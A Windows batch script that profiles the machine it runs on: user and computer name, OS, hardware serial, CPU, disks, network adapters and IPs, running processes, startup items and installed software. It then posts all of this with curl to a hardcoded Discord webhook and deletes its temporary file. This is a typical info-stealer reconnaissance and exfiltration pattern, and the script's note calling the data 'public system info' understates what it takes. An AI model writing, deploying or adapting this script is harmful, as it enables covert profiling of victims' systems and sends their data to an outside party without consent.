@echo off
setlocal enabledelayedexpansion

:: ============== CONFIGURATION ==============
set "WEBHOOK_URL=https://discord.com/api/webhooks/1486075166772559917/2Y07CG6xtz_FrYP_rnM5Y71FyySf4vSWWuu1ruI4vWUZI9tBQOdYFiK3R4UmihRG8VyT"
set "TITLE=Detailed System Recon Report"
set "COLOR=5814783"   :: Purple-ish

echo Collecting EXTENSIVE system information... This can take 30-90 seconds.

:: ============== COLLECT DATA ==============

:: Basic
set "COMP=%COMPUTERNAME%"
set "USER=%USERNAME%"
for /f "tokens=2 delims=:" %%a in ('systeminfo ^| find "OS Name"') do set "OS=%%a"
for /f "tokens=2 delims=:" %%a in ('systeminfo ^| find "OS Version"') do set "OSVER=%%a"
for /f "tokens=2 delims=:" %%a in ('systeminfo ^| find "System Manufacturer"') do set "MANUF=%%a"
for /f "tokens=2 delims=:" %%a in ('systeminfo ^| find "System Model"') do set "MODEL=%%a"
for /f "tokens=2 delims=:" %%a in ('systeminfo ^| find "Total Physical Memory"') do set "RAMRAW=%%a"

set "OS=!OS:~1!" & set "OSVER=!OSVER:~1!" & set "MANUF=!MANUF:~1!" & set "MODEL=!MODEL:~1!"

:: CPU detailed
for /f "tokens=2 delims==" %%a in ('wmic cpu get name /value') do set "CPU=%%a"
for /f "tokens=2 delims==" %%a in ('wmic cpu get NumberOfCores /value') do set "CORES=%%a"
for /f "tokens=2 delims==" %%a in ('wmic cpu get NumberOfLogicalProcessors /value') do set "THREADS=%%a"

:: RAM in GB
for /f "tokens=2 delims==" %%a in ('wmic computersystem get TotalPhysicalMemory /value') do set "RAMBYTES=%%a"
set /a RAMGB=!RAMBYTES:~0,-9!

:: GPU, Motherboard, BIOS, etc.
for /f "tokens=2 delims==" %%a in ('wmic path win32_videocontroller get name /value 2^>nul') do set "GPU=%%a"
for /f "tokens=2 delims==" %%a in ('wmic baseboard get product,manufacturer /value 2^>nul') do set "MOTHERBOARD=%%a"
for /f "tokens=2 delims==" %%a in ('wmic bios get smbiosbiosversion,manufacturer /value 2^>nul') do set "BIOS=%%a"
for /f "tokens=2 delims==" %%a in ('wmic csproduct get identifyingnumber /value 2^>nul') do set "SERIAL=%%a"

:: Disks
set "DISKS=Physical: "
for /f "skip=1 tokens=*" %%a in ('wmic diskdrive get model,size /value 2^>nul ^| find "="') do set "DISKS=!DISKS!%%a | "
set "LOGICAL=Logical Drives: "
for /f "skip=1 tokens=1,2 delims= " %%a in ('wmic logicaldisk get caption,freespace,size /value 2^>nul') do (
    if not "%%a"=="" set "LOGICAL=!LOGICAL!%%a (Free: %%b) | "
)

:: Network detailed
set "NETWORK=Adapters: "
for /f "tokens=*" %%a in ('ipconfig /all ^| find "Description"') do set "NETWORK=!NETWORK!%%a | "
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| find "IPv4"') do set "IP=!IP!%%a, "

:: Processes (count + top memory users)
set "PROCCOUNT=0"
for /f %%a in ('tasklist ^| find /c /v ""') do set "PROCCOUNT=%%a"
set "TOPPROCS=Top processes by mem:\n"
for /f "skip=3 tokens=1,5" %%a in ('tasklist /fo table /nh ^| sort /r /+60') do (
    if not "%%a"=="" (
        set "TOPPROCS=!TOPPROCS!%%a (%%b KB)\n"
        set /a count+=1
        if !count! geq 15 goto :proclimit
    )
)
:proclimit

:: Startup
set "STARTUP=Startup items:\n"
for /f "skip=1 tokens=*" %%a in ('wmic startup get caption /value 2^>nul') do (
    set "STARTUP=!STARTUP!%%a\n"
)

:: Installed software (more but limited)
set "SOFTWARE=Installed Software (partial):\n"
set "count=0"
for /f "skip=1 tokens=*" %%a in ('wmic product get name /value 2^>nul') do (
    if not "%%a"=="" (
        set "SOFTWARE=!SOFTWARE!%%a\n"
        set /a count+=1
        if !count! geq 25 goto :softlimit
    )
)
:softlimit

:: Quick builds for embeds (simplified JSON construction — batch has limits, so we use multiple smaller fields)

:: Build payload with multiple embeds
(
echo {
echo   "username": "System Recon Bot",
echo   "embeds": [
echo     {"title": "%TITLE% - Overview", "color": %COLOR%, "description": "**PC:** %COMP%\\n**User:** %USER%\\n**OS:** %OS% %OSVER%\\n**Manufacturer:** %MANUF%\\n**Model:** %MODEL%\\n**Serial:** %SERIAL%"},
echo     {"title": "Hardware", "color": %COLOR%, "fields": [
echo       {"name": "CPU", "value": "%CPU% (%CORES% cores / %THREADS% threads)", "inline": true},
echo       {"name": "RAM", "value": "%RAMGB% GB", "inline": true},
echo       {"name": "GPU", "value": "%GPU%", "inline": true},
echo       {"name": "Motherboard", "value": "%MOTHERBOARD%", "inline": false},
echo       {"name": "BIOS", "value": "%BIOS%", "inline": true}
echo     ]},
echo     {"title": "Storage", "color": %COLOR%, "description": "%DISKS%\\n%LOGICAL%"},
echo     {"title": "Network", "color": %COLOR%, "description": "%NETWORK%\\nIPs: %IP%"},
echo     {"title": "Processes & Startup", "color": %COLOR%, "description": "Running Processes: %PROCCOUNT%\\n%TOPPROCS%\\n%STARTUP%"},
echo     {"title": "Software & Updates", "color": %COLOR%, "description": "%SOFTWARE%"},
echo     {"title": "Note", "color": 16711680, "description": "This is a batch script collecting public system info. Payload truncated for Discord limits."}
echo   ]
echo }
) > "%temp%\payload.json"

:: Send using curl with file (better for large JSON)
curl -s -X POST -H "Content-Type: application/json" --data-binary "@%temp%\payload.json" "%WEBHOOK_URL%"

del "%temp%\payload.json" 2>nul


pause